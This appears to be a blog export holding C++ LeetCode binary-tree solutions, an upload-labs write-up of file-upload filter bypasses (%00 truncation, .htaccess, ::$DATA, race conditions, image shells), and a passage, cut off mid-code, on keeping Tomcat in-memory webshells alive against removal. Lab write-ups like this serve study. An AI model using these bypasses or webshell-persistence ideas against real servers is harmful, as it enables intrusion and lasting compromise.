<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 采用后序遍历</span></span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//一个是另一个祖先的情况在这里就直接返回了</span></span><br><span class="line">        <span class="keyword">if</span> (root == p || root == q) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TreeNode* left = <span class="built_in">lowestCommonAncestor</span>(root-&gt;left, p, q);</span><br><span class="line">        TreeNode* right = <span class="built_in">lowestCommonAncestor</span>(root-&gt;right, p, q);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (left &amp;&amp; right) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left&amp;&amp;!right) &#123;</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!left&amp;&amp;right) &#123;</span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="235-二叉搜索树的最近公共祖先"><a href="#235-二叉搜索树的最近公共祖先" class="headerlink" title="235. 二叉搜索树的最近公共祖先"></a><a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-search-tree/">235. 二叉搜索树的最近公共祖先</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011117230.png" alt="image-20241001111745083"></p>
<p>这题可以用上题的方法,也可以用更简单的迭代法来做</p>
<p>公共祖先还是两种情况</p>
<ul>
<li>两个结点在不同的子树</li>
<li>其中一个结点是另一个结点的祖先</li>
</ul>
<p>因为二叉搜索树特性,先找到要搜索结点的最大值和最小值</p>
<ul>
<li>当root介于两者之间的时候root就是他俩的公共祖先</li>
<li>当前<code>root-&gt;val</code>比max大,则往左走,当然<code>root-&gt;val</code>比min小,则往右走</li>
<li>如果root直接就等于max或者min的时候,它就是最近公共祖先</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 用迭代法</span></span><br><span class="line">        TreeNode* max = <span class="literal">NULL</span>;</span><br><span class="line">        TreeNode* min = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;val &gt; q-&gt;val) &#123;</span><br><span class="line">            max = p;</span><br><span class="line">            min = q;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            max = q;</span><br><span class="line">            min = p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (root) &#123;</span><br><span class="line">            <span class="keyword">if</span> (root-&gt;val == min-&gt;val || root-&gt;val == max-&gt;val) &#123;</span><br><span class="line">                <span class="keyword">return</span> root;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (root-&gt;val &gt; min-&gt;val &amp;&amp; root-&gt;val &lt; max-&gt;val) &#123;</span><br><span class="line">                <span class="keyword">return</span> root;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (root-&gt;val &gt; max-&gt;val) &#123;</span><br><span class="line">                root = root-&gt;left;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (root-&gt;val &lt; min-&gt;val) &#123;</span><br><span class="line">                root = root-&gt;right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="701-二叉搜索树中的插入操作"><a href="#701-二叉搜索树中的插入操作" class="headerlink" title="701. 二叉搜索树中的插入操作"></a><a href="https://leetcode.cn/problems/insert-into-a-binary-search-tree/">701. 二叉搜索树中的插入操作</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011118532.png" alt="image-20241001111838370"></p>
<p>一边走一边检测是否有空位可以插入</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">insertIntoBST</span><span class="params">(TreeNode* root, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        TreeNode* res = root;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            res = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (root) &#123;</span><br><span class="line">            <span class="keyword">if</span> (val &gt; root-&gt;val) &#123;</span><br><span class="line">                <span class="keyword">if</span> (root-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    root-&gt;right = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(val);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                root = root-&gt;right;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (val &lt; root-&gt;val) &#123;</span><br><span class="line">                <span class="keyword">if</span> (root-&gt;left == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    root-&gt;left = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(val);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                root = root-&gt;left;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="450-删除二叉搜索树中的节点"><a href="#450-删除二叉搜索树中的节点" class="headerlink" title="450. 删除二叉搜索树中的节点"></a><a href="https://leetcode.cn/problems/delete-node-in-a-bst/">450. 删除二叉搜索树中的节点</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011118227.png" alt="image-20241001111851076"></p>
<p>采用先序遍历的递归方式进行删除,迭代法需要记录每次的父节点,有点麻烦</p>
<p>当当前结点是要删除的结点时,为了维护二叉搜索树的特性,要分情况讨论</p>
<ol>
<li>当前节点是叶子结点则直接删除返回NULL给上层函数</li>
<li>当前节点是单支树结点,则直接由其子树接任它的位置</li>
<li>当前节点是有两颗子树的结点,则有两种做法,一种是将其右子树挂在左子树最右下的部位,返回左子树,另一种是将其左子树挂在其右子树最左下的部位返回右子树</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">deleteNode</span><span class="params">(TreeNode* root, <span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val == key) &#123;</span><br><span class="line">            TreeNode* node=root;</span><br><span class="line">            <span class="keyword">if</span> (root-&gt;left == <span class="literal">NULL</span> &amp;&amp; root-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="comment">// 叶节点</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (root-&gt;left &amp;&amp; root-&gt;right) &#123;</span><br><span class="line">                <span class="comment">// 双支树结点</span></span><br><span class="line">                TreeNode* temp = root-&gt;left;</span><br><span class="line">                <span class="keyword">while</span> (temp-&gt;right) &#123;</span><br><span class="line">                    temp = temp-&gt;right;</span><br><span class="line">                &#125;</span><br><span class="line">                temp-&gt;right = root-&gt;right;</span><br><span class="line">                <span class="keyword">return</span> root-&gt;left;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (root-&gt;left) &#123;</span><br><span class="line">                <span class="comment">// 单支树结点</span></span><br><span class="line">                <span class="keyword">return</span> root-&gt;left;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> root-&gt;right;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">delete</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        root-&gt;left = <span class="built_in">deleteNode</span>(root-&gt;left, key);</span><br><span class="line">        root-&gt;right = <span class="built_in">deleteNode</span>(root-&gt;right, key);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="669-修剪二叉搜索树"><a href="#669-修剪二叉搜索树" class="headerlink" title="669. 修剪二叉搜索树"></a><a href="https://leetcode.cn/problems/trim-a-binary-search-tree/">669. 修剪二叉搜索树</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011119574.png" alt="image-20241001111906405"></p>
<p>本题删除节点的逻辑和上题一样,但是这题需要采用后序遍历,因为它要删除不止一个节点,用前序遍历的话删除掉第一个结点之后就返回了</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">trimBST</span><span class="params">(TreeNode* root, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        root-&gt;left = <span class="built_in">trimBST</span>(root-&gt;left, low, high);</span><br><span class="line">        root-&gt;right = <span class="built_in">trimBST</span>(root-&gt;right, low, high);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &lt; low || root-&gt;val &gt; high) &#123;</span><br><span class="line">            <span class="keyword">if</span> (root-&gt;left == <span class="literal">NULL</span> &amp;&amp; root-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (root-&gt;left &amp;&amp; root-&gt;right) &#123;</span><br><span class="line">                TreeNode* temp = root-&gt;left;</span><br><span class="line">                <span class="keyword">while</span> (temp-&gt;right) &#123;</span><br><span class="line">                    temp = temp-&gt;right;</span><br><span class="line">                &#125;</span><br><span class="line">                temp-&gt;right = root-&gt;right;</span><br><span class="line">                <span class="keyword">return</span> root-&gt;left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (root-&gt;left) &#123;</span><br><span class="line">                <span class="keyword">return</span> root-&gt;left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (root-&gt;right) &#123;</span><br><span class="line">                <span class="keyword">return</span> root-&gt;right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="108-将有序数组转换为二叉搜索树"><a href="#108-将有序数组转换为二叉搜索树" class="headerlink" title="108. 将有序数组转换为二叉搜索树"></a><a href="https://leetcode.cn/problems/convert-sorted-array-to-binary-search-tree/">108. 将有序数组转换为二叉搜索树</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011121270.png" alt="image-20241001112122125"></p>
<p>这里的代码最后生成的是个平衡二叉树</p>
<p>很简单的一道题,每次找中间结点就行,这样操作的话最大高度差为1</p>
<p>思考:通过这题可以联想到一个把BST转换为平衡二叉树的笨方法,就是通过中序遍历序列重新像这样构建一棵树</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">sortedArrayToBST</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(nums, <span class="number">0</span>, nums.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">helper</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (left == right) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> mid = (left + right) &gt;&gt; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        TreeNode* root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(nums[mid]);</span><br><span class="line">        root-&gt;left = <span class="built_in">helper</span>(nums, left, mid);</span><br><span class="line">        root-&gt;right = <span class="built_in">helper</span>(nums, mid + <span class="number">1</span>, right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="538-把二叉搜索树转换为累加树"><a href="#538-把二叉搜索树转换为累加树" class="headerlink" title="538. 把二叉搜索树转换为累加树"></a><a href="https://leetcode.cn/problems/convert-bst-to-greater-tree/">538. 把二叉搜索树转换为累加树</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202409282055099.png" alt="image-20240928114229681"></p>
<p>让每个结点的值都等于大于等于它的结点的和,可以采用<code>右根左</code>的遍历顺序去维护sum变量每次修改结点的值即可</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">convertBST</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">convertBST</span>(root-&gt;right);</span><br><span class="line">        sum += root-&gt;val;</span><br><span class="line">        root-&gt;val = sum;</span><br><span class="line">        <span class="built_in">convertBST</span>(root-&gt;left);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="二叉树的序列化与反序列化"><a href="#二叉树的序列化与反序列化" class="headerlink" title="二叉树的序列化与反序列化"></a>二叉树的序列化与反序列化</h3><p>可以通过先序,后序,层序序列化二叉树为字符串唯一表示一棵二叉树</p>
<p>序列化就是在遍历过程中把空节点也记录到遍历序列中</p>
<h4 id="297-二叉树的序列化与反序列化"><a href="#297-二叉树的序列化与反序列化" class="headerlink" title="297. 二叉树的序列化与反序列化"></a><a href="https://leetcode.cn/problems/serialize-and-deserialize-binary-tree/">297. 二叉树的序列化与反序列化</a></h4><p>写了一坨<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410031848157.png" alt="img">先理解一下大概过程,后面有时间再好好精简一下代码</p>
<p>//这里是先序序列化和反序列化的代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Codec</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    vector&lt;string&gt; preSerialize;</span><br><span class="line">    vector&lt;string&gt; preTraversal;</span><br><span class="line">    <span class="comment">// Encodes a tree to a single string.</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">preTraverse</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            preSerialize.<span class="built_in">push_back</span>(<span class="string">&quot;#&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        preSerialize.<span class="built_in">push_back</span>(<span class="built_in">to_string</span>(root-&gt;val));</span><br><span class="line">        <span class="built_in">preTraverse</span>(root-&gt;left);</span><br><span class="line">        <span class="built_in">preTraverse</span>(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">serialize</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">preTraverse</span>(root);</span><br><span class="line">        string res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; preSerialize.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            res += preSerialize[i] + <span class="string">&quot;,&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decodes your encoded data to tree.</span></span><br><span class="line">    <span class="function">TreeNode* <span class="title">deserialize</span><span class="params">(string data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">convertTo</span>(data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (preTraversal[count] == <span class="string">&quot;#&quot;</span>) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TreeNode* root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="built_in">stoi</span>(preTraversal[count]));</span><br><span class="line">        count++;</span><br><span class="line">        root-&gt;left = <span class="built_in">deserialize</span>(data);</span><br><span class="line">        root-&gt;right = <span class="built_in">deserialize</span>(data);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">convertTo</span><span class="params">(string data)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 先把序列化字符串换原为字符串数组</span></span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; data.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (data[i] == <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line">                preTraversal.<span class="built_in">push_back</span>(data.<span class="built_in">substr</span>(left, i - left));</span><br><span class="line">                left = i + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Your Codec object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment">// Codec ser, deser;</span></span><br><span class="line"><span class="comment">// TreeNode* ans = deser.deserialize(ser.serialize(root));</span></span><br></pre></td></tr></table></figure>







<h3 id="关于二叉树的一些性质的题目"><a href="#关于二叉树的一些性质的题目" class="headerlink" title="关于二叉树的一些性质的题目"></a>关于二叉树的一些性质的题目</h3><h4 id="判断一个二叉树是不是完全二叉树"><a href="#判断一个二叉树是不是完全二叉树" class="headerlink" title="判断一个二叉树是不是完全二叉树"></a>判断一个二叉树是不是完全二叉树</h4><p>可以采用层序遍历,这里的层序入队要求是当前结点不为空就把其左右孩子入队,出队的时候如果遇到一个NULL,则判断队列里剩下的是不是全是NULL,如果有非NULL的,则不是完全二叉树,如果全是NULL,则是完全二叉树</p>
<h4 id="判断是不是满二叉树"><a href="#判断是不是满二叉树" class="headerlink" title="判断是不是满二叉树"></a>判断是不是满二叉树</h4><ol>
<li>可以采用层序遍历判断每一层的元素个数</li>
<li>可以后序从下向上返回每棵子树的左右子树高度是否相等</li>
</ol>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs</title>
    <url>/2021/12/05/upload-labs/</url>
    <content><![CDATA[<h3 id="upload-labs笔记"><a href="#upload-labs笔记" class="headerlink" title="upload-labs笔记"></a>upload-labs笔记</h3><h5 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h5><p>查看网页源代码发现是js本地判断文件格式,禁用js即可上传成功</p>
<h5 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h5><p>抓包分析,更改Content-Type为image/jpeg即可</p>
<h5 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h5><p>查看代码后发现是黑名单禁止,并且大小写,空格,加点,换行均不能绕过,所以考虑到使用php3,phtml绕过,但是执行需要服务器开启响应扩展才行..局限性:默认是无法解析这种后缀的,而且只在php5.2.17上可以开启并实现,其余版本均失败</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410042119188.png" alt="image-20241004211929155"></p>
<h5 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h5><p>利用apache解析漏洞,上传后缀为php.xxx,当其无法解析时,会向前寻找到正确的后缀并进行解析或者使用.htaccess文件让apache以php方式进行解析图片格式的文件</p>
<p>使用这种写法可以精准解析该文件名的文件</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410042125519.png" alt="image-20241004212504493"></p>
<h5 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h5><p>通过对源码的阅读,发现少了字母一律转换成小写的代码,所以可以使用phP进行绕过同理使用.htaccess文件也可进行大写绕过</p>
<h5 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h5><p>通过尝试发现空格即可绕过,通过对源码的阅读印证了想法,未在源码中添加首尾去空的功能</p>
<h5 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h5><p>本题禁止上传所有带有可以解析的后缀的文件利用在文件名末尾添加点绕过没有对后缀名末尾的点进行处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过：pass-08::$DATA绕过**没有对后缀名中的’::$DATA’进行过滤。在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。利用windows特性，可在后缀名中加” ::$DATA”绕过:</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410042119930.png" alt="image-20241004211945904"></p>
<h5 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h5><p>利用.加空格绕过代码先是去除文件名前后的空格，再去除文件名最后所有的.，再通过strrchar函数来寻找.来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410042121971.png" alt="image-20241004212153923"></p>
<h5 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h5><p>分析代码可知代码使用了黑名单设置,对文件名中包含的黑名单中的后缀使用trim函数进行移除,所以思路就是写一个被移除后正好能变成可解析后缀的文件名即可,如,pphphp</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410042120596.png" alt="image-20241004212055562"></p>
<h5 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h5><p>使用白名单只允许特定后缀 白名单判断，使用jpg格式后缀即可,但$img_path是直接拼接，因此可以利用%00截断,利用创建路径的函数修改文件名和后缀%00在解码后是空字符</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410042121277.png" alt="image-20241004212114248"></p>
<p>使用00%截断绕过(截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态)</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410042121323.png" alt="image-20241004212129298"></p>
<h5 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h5><p>和上个pass思路一样,因为存储路径可控,所以一样使用00截断,只不过 这次的路劲通过POST方式传递,不会对%00进行url解码,所以需要在burp suite的hex功能点处,找到对应位置,将其修改为00</p>
<h5 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h5><p>该pass检查文件开头的标识,所以用图片马过需要配合文件包含漏洞或者解析漏洞</p>
<h5 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h5><p>该pass通过getimagesize($filename);函数判断是否为图片需要配合文件包含漏洞或者解析漏洞</p>
<h5 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h5><p>因为是先上传再判断,所以存在条件竞争重复发上传的数据包,在存在的一瞬间访问到就行</p>
<h5 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h5><p>条件竞争,并且先判断了后缀再移动,上传图片马,利用文件包含漏洞</p>
<h5 id="pass-19"><a href="#pass-19" class="headerlink" title="pass-19"></a>pass-19</h5><p>1.上传名称可控,但是是黑名单判断,可以写xx.php%00.jpg用%00截断</p>
<p>2.将保存名称写为xxx.php/.绕过黑名单,并且还会保存为xxx.php</p>
]]></content>
      <categories>
        <category>upload</category>
      </categories>
      <tags>
        <tag>upload</tag>
        <tag>upload-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>内存马防killed</title>
    <url>/2022/04/23/%E5%86%85%E5%AD%98%E9%A9%AC%E9%98%B2killed/</url>
    <content><![CDATA[<p>servlet和filter类型的内存马如何防止被删除呢</p>
<p>一种思路就是在servlet和filter的destory中加入再次注册内存马的代码</p>
<p>以filter为例</p>
<p>但是有一点,我不知道这个destory方法会在啥时候被调用,难道是一些查杀工具动态调用destory方法来终止filter的生命周期吗?</p>
<p>而且并不是所有的删除方法都会触发destory方法</p>
<p>还有一种思路,就是创建一个不死线程,一直检测该filter在不在,不在就立马执行注册流程注册一个</p>
<p>我的思路可能比较简单</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220424001711544.png" alt="image-20220424001711544"></p>
<p>之前在context中调用了这个addFilterDef方法往filterDefs这个MAP中存入了filter的name和def这个类,我觉得可以通过检测context中该属性是否contains对应的Filter的name来判断是否被destory了,然后让该线程一直运行,直到服务关闭</p>
<p>下面这段代码虽然看起来没问题,但是应该没实现想要的功能,思路应该没问题吧….</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span 